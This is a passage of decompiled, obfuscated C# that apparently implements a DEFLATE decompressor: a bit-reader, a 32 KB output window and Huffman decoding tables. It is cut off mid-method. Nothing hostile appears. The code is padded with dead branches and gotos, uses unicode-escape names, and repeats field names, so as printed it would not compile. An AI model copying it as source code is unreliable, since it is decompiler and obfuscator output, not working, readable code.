              byte[] numArray1 = this.\u0001;
              \u0004.\u0002 obj2 = this;
              int num14;
              num1 = num14 = obj2.\u0001;
              obj2.\u0001 = num14 + 1;
              int index1 = num1;
              int num15 = (int) numArray1[index1] & (int) byte.MaxValue;
              byte[] numArray2 = this.\u0001;
              num1 = this.\u0001++;
              int index2 = num1;
              int num16 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
              int num17 = (num15 | num16) << this.\u0003;
              obj1.\u0001 = (uint) (num13 | num17);
              if (true)
              {
                this.\u0003 += 16;
                goto label_4;
              }
              else
                goto label_0;
            }
            else
              break;
          }
          return -1;
label_11:
          return num3;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0002([In] int obj0)
      {
label_0:
        try
        {
          this.\u0001 >>= obj0;
label_1:
          if (true)
          {
label_6:
            this.\u0003 -= obj0;
            do
            {
              if (true)
              {
                if (false)
                  goto label_1;
              }
              else
                goto label_6;
            }
            while (false);
          }
          else
            goto label_0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0005.\u0002(ex, (object) this, (object) local);
          throw;
        }
      }

      [SpecialName]
      public int \u0002()
      {
        try
        {
          return this.\u0003;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public int \u0003()
      {
        try
        {
          int num1 = this.\u0002;
          int num2;
          while (true)
          {
            int num3 = this.\u0001;
            int num4 = num1 - num3;
            if (true)
            {
              if (false)
              {
                num1 = num4;
              }
              else
              {
                num1 = num4;
                break;
              }
            }
            else
            {
              num2 = num4;
              goto label_4;
            }
          }
          goto label_7;
label_4:
          if (true)
            return num2;
          num1 = num2;
label_7:
          int num5 = this.\u0003 >> 3;
          num2 = num1 + num5;
          goto label_4;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u0001 >>= this.\u0003 & 7;
          this.\u0003 &= -8;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool \u0002()
      {
        try
        {
          return this.\u0001 == this.\u0002;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        int num3;
        try
        {
          num1 = 0;
          int num4;
          while (true)
          {
            int num5 = this.\u0003;
            int num6 = 0;
            if (num6 == 0)
              goto label_4;
label_2:
            num1 = num5 + num6;
            continue;
label_4:
            int num7;
            int num8;
            if (num6 == 0)
            {
              if (true)
              {
                if (num5 <= num6 || obj2 <= 0)
                {
                  num4 = obj2;
                }
                else
                {
                  obj0[obj1++] = (byte) this.\u0001;
                  goto label_23;
                }
              }
              else
              {
                num8 = num6;
                num7 = num5;
                goto label_12;
              }
            }
            else
              goto label_20;
label_8:
            int num9;
            if (num4 != 0)
              num9 = this.\u0002;
            else
              break;
label_11:
            int num10 = this.\u0001;
            num2 = num9 - num10;
            num7 = obj2;
            num8 = num2;
label_12:
            if (num7 > num8)
              obj2 = num2;
            Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
            this.\u0001 += obj2;
            if ((this.\u0001 - this.\u0002 & 1) != 0)
            {
              byte[] numArray = this.\u0001;
              num3 = this.\u0001++;
              int index = num3;
              this.\u0001 = (uint) numArray[index] & (uint) byte.MaxValue;
              this.\u0003 = 8;
            }
            if (true)
            {
              if (true)
              {
                int num11 = num1;
                if (false)
                {
                  num9 = num11;
                  goto label_11;
                }
                else
                {
                  num6 = obj2;
                  num5 = num11;
                }
              }
              else
                break;
            }
            else
              goto label_23;
label_20:
            num4 = num5 + num6;
            if (false)
              goto label_8;
            else
              goto label_21;
label_23:
            this.\u0001 >>= 8;
            this.\u0003 -= 8;
            obj2--;
            int num12 = num1;
            num6 = 1;
            num5 = num12;
            goto label_2;
          }
          return num1;
label_21:
          return num4;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) this, (object) numArray, (object) local4, (object) local5);
          throw;
        }
      }

      public \u0002()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
          if (true)
            goto label_7;
label_5:
          this.\u0003 += 8;
label_6:
          this.\u0001 = obj0;
          this.\u0001 = obj1;
          this.\u0002 = num1;
          return;
label_7:
          if (this.\u0001 < this.\u0002)
            throw new InvalidOperationException();
          int num2 = obj1 + obj2;
          if (true)
            goto label_10;
label_1:
          if (0 > obj1 || obj1 > num1 || num1 > obj0.Length)
            throw new ArgumentOutOfRangeException();
          if ((obj2 & 1) != 0)
          {
            this.\u0001 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << this.\u0003);
            goto label_5;
          }
          else
            goto label_6;
label_10:
          num1 = num2;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) numArray, (object) local2, (object) local3);
          throw;
        }
      }
    }

    internal sealed class \u0003
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0001 = 0;
      private int \u0002 = 0;

      public void \u0002([In] int obj0)
      {
        int num1;
        try
        {
          if (true)
          {
            \u0004.\u0003 obj = this;
            int num2;
            num1 = num2 = obj.\u0002;
            obj.\u0002 = num2 + 1;
          }
          int num3 = num1;
          if (false)
            goto label_2;
label_1:
          if (num3 != 32768)
          {
            byte[] numArray = this.\u0001;
            \u0004.\u0003 obj = this;
            int num4;
            num1 = num4 = obj.\u0001;
            obj.\u0001 = num4 + 1;
            int index = num1;
            int num5 = (int) (byte) obj0;
            numArray[index] = (byte) num5;
            num3 = 2;
          }
          else
            goto label_7;
label_2:
          if (true)
          {
            if (num3 != 0)
            {
              this.\u0001 &= (int) short.MaxValue;
              return;
            }
          }
          else
            goto label_1;
label_7:
          throw new InvalidOperationException();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      private void \u0002([In] int obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
          int num2 = 8;
          if (num2 != 0)
          {
            if (num2 != 0)
              goto label_4;
          }
          else
            goto label_5;
label_2:
          if (false)
            return;
          byte[] numArray = this.\u0001;
          \u0004.\u0003 obj = this;
          int num3;
          num1 = num3 = obj.\u0001;
          obj.\u0001 = num3 + 1;
          int index = num1;
          int num4 = (int) this.\u0001[obj0++];
          numArray[index] = (byte) num4;
          this.\u0001 &= (int) short.MaxValue;
          goto label_10;
label_4:
          num2 = 0;
label_5:
          int num5;
          int num6;
          if (num2 == 0)
          {
            int num7 = obj1;
            num6 = num7 - 1;
            num5 = num7;
          }
          else
            goto label_10;
label_7:
          obj1 = num6;
          if (num5 <= 0)
            return;
          goto label_2;
label_10:
          num5 = obj0;
          num6 = (int) short.MaxValue;
          if (num6 != 0)
          {
            obj0 = num5 & num6;
            goto label_4;
          }
          else
            goto label_7;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2, (object) local3, (object) local4);
          throw;
        }
      }

      public void \u0002([In] int obj0, [In] int obj1)
      {
        int num1;
        int sourceIndex;
        int num2;
        try
        {
          num2 = (this.\u0002 += obj0);
          if (num2 > 32768)
            throw new InvalidOperationException();
          sourceIndex = this.\u0001 - obj1 & (int) short.MaxValue;
          num1 = 32768 - obj0;
          if (sourceIndex <= num1 && this.\u0001 < num1)
          {
            if (obj0 <= obj1)
            {
              Array.Copy((Array) this.\u0001, sourceIndex, (Array) this.\u0001, this.\u0001, obj0);
              this.\u0001 += obj0;
            }
            else
            {
              while (obj0-- > 0)
              {
                byte[] numArray = this.\u0001;
                num2 = this.\u0001++;
                int index = num2;
                int num3 = (int) this.\u0001[sourceIndex++];
                numArray[index] = (byte) num3;
              }
            }
          }
          else
            this.\u0002(sourceIndex, obj0, obj1);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) sourceIndex;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj1;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) this, (object) local4, (object) local5);
          throw;
        }
      }

      public int \u0002([In] \u0004.\u0002 obj0, [In] int obj1)
      {
        int num1;
        int num2;
        try
        {
          int val1_1 = obj1;
          int val1_2;
          int val2_1;
          if (true)
          {
            int val2_2 = 32768;
            if (val2_2 != 0)
              val2_2 -= this.\u0002;
            int num3 = Math.Min(val1_1, val2_2);
            val2_1 = obj0.\u0003();
            val1_2 = num3;
          }
          else
            goto label_15;
label_14:
          int num4 = Math.Min(val1_2, val2_1);
          if (true)
          {
            obj1 = num4;
            val1_1 = 32768;
          }
          else
            val1_1 = num4;
label_15:
          int num5 = this.\u0001;
          while (true)
          {
            num1 = val1_1 - num5;
            int num6;
            int num7;
            do
            {
              val1_2 = obj1;
              val2_1 = num1;
              if (true)
              {
                if (val1_2 > val2_1)
                {
                  num2 = obj0.\u0002(this.\u0001, this.\u0001, num1);
                  num6 = num2;
                  num7 = num1;
                  if (true)
                  {
                    if (num6 == num7)
                      num2 += obj0.\u0002(this.\u0001, 0, obj1 - num1);
                  }
                  else
                    goto label_2;
                }
                else
                  num2 = obj0.\u0002(this.\u0001, this.\u0001, obj1);
                this.\u0001 = this.\u0001 + num2 & (int) short.MaxValue;
              }
              else
                goto label_14;
            }
            while (false);
            break;
label_2:
            num5 = num7;
            val1_1 = num6;
          }
          this.\u0002 += num2;
          return num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          \u0004.\u0002 obj = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj1;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) this, (object) obj, (object) local3);
          throw;
        }
      }

      public int \u0002()
      {
        try
        {
          return 32768 - this.\u0002;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0003()
      {
        try
        {
          return this.\u0002;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public int \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        int length;
        try
        {
          num2 = this.\u0001;
          int num3 = obj2;
          while (true)
          {
            int num4 = this.\u0002;
            if (num3 <= num4)
              goto label_17;
            else
              goto label_16;
label_2:
            int num5;
            int num6;
            if (num6 != 0)
            {
              num3 = num5;
              continue;
            }
label_3:
            num2 = num5 & (int) short.MaxValue;
label_4:
            num1 = obj2;
            num5 = obj2;
            num6 = 0;
            int num7;
            int num8;
            if (num6 == 0)
            {
              if (num6 == 0)
              {
                if (num6 == 0)
                {
                  int num9 = num2;
                  length = num5 - num9;
                  int num10 = length;
                  num6 = 0;
                  num5 = num10;
                }
                else
                  goto label_3;
              }
              if (num5 > num6)
              {
                Array.Copy((Array) this.\u0001, 32768 - length, (Array) obj0, obj1, length);
                int num11 = obj1;
                num8 = length;
                num7 = num11;
              }
              else
                goto label_11;
            }
            else
              goto label_2;
label_10:
            obj1 = num7 + num8;
            obj2 = num2;
label_11:
            Array.Copy((Array) this.\u0001, num2 - obj2, (Array) obj0, obj1, obj2);
            this.\u0002 -= num1;
            if (this.\u0002 >= 0)
            {
              if (false)
                goto label_4;
              else
                goto label_14;
            }
            else
              break;
label_16:
            obj2 = this.\u0002;
            goto label_4;
label_17:
            num7 = this.\u0001 - this.\u0002;
            num8 = obj2;
            if (true)
            {
              int num12 = num7 + num8;
              num6 = 0;
              num5 = num12;
              goto label_2;
            }
            else
              goto label_10;
          }
          throw new InvalidOperationException();
label_14:
          return num1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) length;
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj2;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) this, (object) numArray, (object) local4, (object) local5);
          throw;
        }
      }

      public \u0003()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }
    }

    internal sealed class \u0004
    {
      private short[] \u0001;
      public static readonly \u0004.\u0004 \u0001;
      public static readonly \u0004.\u0004 \u0002;

      static \u0004()
      {
label_0:
        int num;
        byte[] numArray1;
        try
        {
          numArray1 = new byte[288];
          num = 0;
          if (false)
            goto label_5;
          else
            goto label_16;
label_4:
          while (num < 280)
            numArray1[num++] = (byte) 7;
          goto label_7;
label_5:
          if (true)
            numArray1[num++] = (byte) 8;
          else
            goto label_12;
label_7:
          if (num >= 288)
          {
            if (true)
            {
              \u0004.\u0004.\u0001 = new \u0004.\u0004(numArray1);
              numArray1 = new byte[32];
              num = 0;
              while (num < 32)
                numArray1[num++] = (byte) 5;
            }
            else
              goto label_0;
          }
          else
            goto label_5;
label_12:
          if (false)
            goto label_4;
label_13:
          \u0004.\u0004.\u0002 = new \u0004.\u0004(numArray1);
          if (true)
            return;
          goto label_12;
label_16:
          while (num < 144)
            numArray1[num++] = (byte) 8;
          for (; num < 256; numArray1[num++] = (byte) 9)
          {
            if (false)
              goto label_13;
          }
          goto label_4;
        }
        catch (Exception ex)
        {
          byte[] numArray2 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) num;
          \u0005.\u0002(ex, (object) numArray2, (object) local);
          throw;
        }
      }

      public \u0004([In] byte[] obj0)
      {
        try
        {
          this.\u0002(obj0);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0005.\u0002(ex, (object) this, (object) numArray);
          throw;
        }
      }

      private void \u0002([In] byte[] obj0)
      {
        int num1;
        int[] numArray1;
        int index1;
        int num2;
        int length;
        int index2;
        int[] numArray2;
        int[] numArray3;
        int num3;
        int num4;
        int num5;
        int index3;
        int num6;
        int num7;
        int num8;
        int index4;
        int index5;
        int index6;
        int num9;
        int num10;
        int index7;
        try
        {
          numArray3 = new int[16];
label_1:
          numArray2 = new int[16];
          for (index1 = 0; index1 < obj0.Length; ++index1)
          {
            num1 = (int) obj0[index1];
            if (num1 <= 0)
              continue;
            (numArray1 = numArray3)[index7 = num1] = numArray1[(IntPtr) index7] + 1;
          }
          num2 = 0;
          length = 512;
          for (index2 = 1; index2 <= 15; ++index2)
          {
            numArray2[index2] = num2;
            num2 += numArray3[index2] << 16 - index2;
            if (index2 >= 10)
            {
              num3 = numArray2[index2] & 130944;
              if (true)
              {
                if (true)
                {
                  num4 = num2 & 130944;
                  if (true)
                    length += num4 - num3 >> 16 - index2;
                  else
                    goto label_1;
                }
                else
                  goto label_18;
              }
              else
                goto label_28;
            }
          }
          this.\u0001 = new short[(int) checked ((uint) length)];
          num5 = 512;
          int num11 = 15;
label_14:
          index3 = num11;
          goto label_24;
label_16:
          int num12 = numArray3[index3] << 16 - index3;
          int num13;
          num11 = num13 - num12;
          if (true)
          {
            num2 = num11;
            num7 = num2 & 130944;
          }
          else
            goto label_14;
label_18:
          for (num8 = num7; num8 < num6; num8 = num13 + 128)
          {
            if (true)
            {
              this.\u0001[(int) \u0004.\u0007.\u0002(num8)] = (short) (-num5 << 4 | index3);
              num5 += 1 << index3 - 9;
              num13 = num8;
              if (false)
                goto label_16;
            }
            else
              goto label_18;
          }
          --index3;
label_24:
          if (index3 >= 10)
          {
            num6 = num2 & 130944;
            num13 = num2;
            goto label_16;
          }
label_25:
          index4 = 0;
          goto label_36;
label_28:
          int num14;
          int num15;
          if (true)
          {
            if (index5 <= 9)
            {
              do
              {
                this.\u0001[index6] = (short) (index4 << 4 | index5);
                index6 += 1 << index5;
              }
              while (index6 < 512);
            }
            else
            {
              num9 = (int) this.\u0001[index6 & 511];
              int num16 = 1;
              int num17 = num9 & 15;
              if (true)
              {
                int num18 = num17 & 31;
                num10 = num16 << num18;
                num9 = -(num9 >> 4);
                do
                {
                  this.\u0001[num9 | index6 >> 9] = (short) (index4 << 4 | index5);
                  index6 += 1 << index5;
                }
                while (index6 < num10);
              }
              else
              {
                num15 = num17;
                num14 = num16;
                goto label_37;
              }
            }
            numArray2[index5] = num2 + (1 << 16 - index5);
          }
          else
            goto label_25;
label_35:
          ++index4;
label_36:
          num14 = index4;
          num15 = obj0.Length;
label_37:
          if (num14 >= num15)
            return;
          index5 = (int) obj0[index4];
          if (index5 != 0)
          {
            num2 = numArray2[index5];
            index6 = (int) \u0004.\u0007.\u0002(num2);
            goto label_28;
          }
          else
            goto label_35;
        }
        catch (Exception ex)
        {
          object[] objArray = new object[23]
          {
            (object) numArray3,
            (object) numArray2,
            (object) index1,
            (object) num1,
            (object) num2,
            (object) length,
            (object) index2,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) index3,
            (object) num6,
            (object) num7,
            (object) num8,
            (object) index4,
            (object) index5,
            (object) index6,
            (object) num9,
            (object) num10,
            (object) numArray1,
            (object) (IntPtr) index7,
            (object) this,
            (object) obj0
          };
          \u0005.\u0002(ex, objArray);
          throw;
        }
      }

      public int \u0002([In] \u0004.\u0002 obj0)
      {
        int num1;
        int num2;
        int num3;
        int index;
        int num4;
        int num5;
        try
        {
          int num6 = obj0.\u0002(9);
          int num7;
          int num8;
          int num9;
          int num10;
          while (true)
          {
            index = num6;
            if (num6 < 0)
              goto label_18;
            else
              goto label_23;
label_2:
            if (num7 < 0)
            {
              num2 = -(num1 >> 4);
              num3 = num1 & 15;
              num7 = obj0.\u0002(num3);
            }
            else
            {
              obj0.\u0002(num1 & 15);
              num9 = num1;
              if (false)
              {
                num7 = num9;
                goto label_9;
              }
              else
                break;
            }
label_5:
            if (true)
            {
              if (true)
                num8 = num7;
              else
                goto label_15;
            }
            else
              goto label_2;
label_8:
            index = num8;
label_9:
            if (true)
            {
              if (num7 >= 0)
              {
                num1 = (int) this.\u0001[num2 | index >> 9];
                if (false)
                  goto label_18;
                else
                  goto label_12;
              }
              else
              {
                num4 = obj0.\u0002();
                index = obj0.\u0002(num4);
                num1 = (int) this.\u0001[num2 | index >> 9];
                if ((num1 & 15) <= num4)
                {
                  obj0.\u0002(num1 & 15);
                  num7 = num1;
                }
                else
                  goto label_17;
              }
            }
            else
              goto label_5;
label_15:
            num10 = num7 >> 4;
            if (false)
            {
              num6 = num10;
              continue;
            }
            goto label_16;
label_18:
            num5 = obj0.\u0002();
            index = obj0.\u0002(num5);
            num1 = (int) this.\u0001[index];
            if (num1 >= 0)
            {
              num7 = num1;
              num8 = 15;
              if (num8 == 0)
                goto label_8;
              else
                goto label_20;
            }
            else
              goto label_22;
label_23:
            num7 = num1 = (int) this.\u0001[index];
            goto label_2;
          }
          return num9 >> 4;
label_12:
          obj0.\u0002(num1 & 15);
          return num1 >> 4;
label_16:
          return num10;
label_17:
          return -1;
label_20:
          if ((num7 & num8) <= num5)
          {
            obj0.\u0002(num1 & 15);
            return num1 >> 4;
          }
label_22:
          return -1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local6 = (ValueType) num5;
          \u0004.\u0002 obj = obj0;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this, (object) obj);
          throw;
        }
      }
    }

    internal sealed class \u0005
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0004.\u0004 \u0001;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private int \u0006;
      private byte \u0001;
      private int \u0007;
      private static readonly int[] \u0003;

      public \u0005()
      {
        try
        {
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public bool \u0002([In] \u0004.\u0002 obj0)
      {
        int num1;
        int num2;
        int num3;
        byte num4;
        int num5;
        int num6;
        try
        {
          while (true)
          {
            num2 = this.\u0001;
            switch (num2)
            {
              case 0:
                this.\u0002 = obj0.\u0002(5);
                if (this.\u0002 >= 0)
                {
                  this.\u0002 += 257;
                  obj0.\u0002(5);
                  this.\u0001 = 1;
                  goto case 1;
                }
                else
                  goto label_1;
              case 1:
                this.\u0003 = obj0.\u0002(5);
                if (this.\u0003 >= 0)
                {
                  ++this.\u0003;
                  obj0.\u0002(5);
                  this.\u0005 = this.\u0002 + this.\u0003;
                  this.\u0002 = new byte[(int) checked ((uint) this.\u0005)];
                  this.\u0001 = 2;
                  goto case 2;
                }
                else
                  goto label_3;
              case 2:
                this.\u0004 = obj0.\u0002(4);
                if (this.\u0004 >= 0)
                {
                  this.\u0004 += 4;
                  obj0.\u0002(4);
                  this.\u0001 = new byte[19];
                  this.\u0007 = 0;
                  this.\u0001 = 3;
                  goto case 3;
                }
                else
                  goto label_6;
              case 3:
                for (; this.\u0007 < this.\u0004; ++this.\u0007)
                {
                  num1 = obj0.\u0002(3);
                  if (num1 < 0)
                    return false;
                  obj0.\u0002(3);
                  this.\u0001[\u0004.\u0005.\u0003[this.\u0007]] = (byte) num1;
                }
                this.\u0001 = new \u0004.\u0004(this.\u0001);
                this.\u0001 = (byte[]) null;
                this.\u0007 = 0;
                this.\u0001 = 4;
                goto case 4;
              case 4:
                while (((num3 = this.\u0001.\u0002(obj0)) & -16) == 0)
                {
                  byte[] numArray = this.\u0002;
                  num2 = this.\u0007++;
                  int index = num2;
                  this.\u0001 = num4 = (byte) num3;
                  int num7 = (int) num4;
                  numArray[index] = (byte) num7;
                  if (this.\u0007 == this.\u0005)
                    return true;
                }
                if (num3 >= 0)
                {
                  if (num3 >= 17)
                    this.\u0001 = (byte) 0;
                  this.\u0006 = num3 - 16;
                  this.\u0001 = 5;
                  goto case 5;
                }
                else
                  goto label_17;
              case 5:
                num5 = \u0004.\u0005.\u0002[this.\u0006];
                num6 = obj0.\u0002(num5);
                if (num6 >= 0)
                {
                  obj0.\u0002(num5);
                  num6 += \u0004.\u0005.\u0001[this.\u0006];
                  while (num6-- > 0)
                  {
                    byte[] numArray = this.\u0002;
                    num2 = this.\u0007++;
                    int index = num2;
                    int num8 = (int) this.\u0001;
                    numArray[index] = (byte) num8;
                  }
                  if (this.\u0007 != this.\u0005)
                  {
                    this.\u0001 = 4;
                    continue;
                  }
                  goto label_27;
                }
                else
                  goto label_22;
              default:
                continue;
            }
          }
label_1:
          return false;
label_3:
          return false;
label_6:
          return false;
label_17:
          return false;
label_22:
          return false;
label_27:
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num6;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<byte> local6 = (ValueType) num4;
          \u0004.\u0002 obj = obj0;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this, (object) obj);
          throw;
        }
      }

      public \u0004.\u0004 \u0002()
      {
        byte[] destinationArray;
        try
        {
          destinationArray = new byte[(int) checked ((uint) this.\u0002)];
          Array.Copy((Array) this.\u0002, 0, (Array) destinationArray, 0, this.\u0002);
          return new \u0004.\u0004(destinationArray);
        }
        catch (Exception ex)
        {
          byte[] numArray = destinationArray;
          \u0005.\u0002(ex, (object) numArray, (object) this);
          throw;
        }
      }

      public \u0004.\u0004 \u0003()
      {
        byte[] destinationArray;
        try
        {
          int num = this.\u0003;
          int length;
          while (true)
          {
            length = (int) checked ((uint) num);
            if (false)
              num = length;
            else
              break;
          }
          destinationArray = new byte[length];
          if (true)
            Array.Copy((Array) this.\u0002, this.\u0002, (Array) destinationArray, 0, this.\u0003);
          return new \u0004.\u0004(destinationArray);
        }
        catch (Exception ex)
        {
          byte[] numArray = destinationArray;
          \u0005.\u0002(ex, (object) numArray, (object) this);
          throw;
        }
      }

      static \u0005()
      {
        try
        {
          int length = 3;
          if (length != 0)
          {
            int[] numArray = new int[length];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0005.\u0001));
            \u0004.\u0005.\u0001 = numArray;
          }
          else
            goto label_4;
label_2:
          do
          {
            \u0004.\u0005.\u0002 = new int[3]
            {
              2,
              3,
              7
            };
          }
          while (false);
          length = 19;
label_4:
          int[] numArray1 = new int[length];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0005.\u0001));
          \u0004.\u0005.\u0003 = numArray1;
          if (false)
            goto label_2;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex);
          throw;
        }
      }
    }

    internal sealed class \u0006
    {
      private int \u0001 = 16;
      private long \u0001 = 0;
      private \u0004.\u000E \u0001;
      private \u0004.\u0008 \u0001;

      public \u0006()
      {
        try
        {
          this.\u0001 = new \u0004.\u000E();
          this.\u0001 = new \u0004.\u0008(this.\u0001);
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public long \u0002()
      {
        try
        {
          return this.\u0001;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u0001 |= 12;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool \u0002()
      {
        try
        {
          return this.\u0001 == 30 && this.\u0001.\u0002();
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool \u0003()
      {
        try
        {
          return this.\u0001.\u0002();
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public void \u0002([In] byte[] obj0)
      {
        try
        {
          this.\u0001.\u0002(obj0);
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          \u0005.\u0002(ex, (object) this, (object) numArray);
          throw;
        }
      }

      public int \u0002([In] byte[] obj0)
      {
        int num1;
        int num2;
        int length;
        int num3;
        int num4;
        try
        {
          num2 = 0;
          length = obj0.Length;
          num3 = length;
          while (true)
          {
            int num5;
            int num6;
            do
            {
              do
              {
                int num7 = this.\u0001.\u0002(obj0, num2, length);
                if (true)
                {
                  num1 = num7;
                  num2 += num1;
                  if (true)
                  {
                    this.\u0001 += (long) num1;
                    length -= num1;
                  }
                  if (length != 0 && this.\u0001 != 30)
                  {
                    if (!this.\u0001.\u0003((this.\u0001 & 4) != 0, (this.\u0001 & 8) != 0))
                      num7 = this.\u0001;
                    else
                      continue;
                  }
                  else
                    goto label_23;
                }
                if (num7 != 16)
                {
                  num5 = this.\u0001;
                  num6 = 20;
                  if (num6 != 0)
                  {
                    if (num5 == num6)
                      goto label_11;
                  }
                  else
                    goto label_15;
                }
                else
                  goto label_8;
              }
              while (this.\u0001 != 28);
              this.\u0001.\u0002();
              this.\u0001 = 30;
            }
            while (false);
            continue;
label_11:
            int num8 = 8;
            int num9 = -this.\u0001.\u0002();
            int num10;
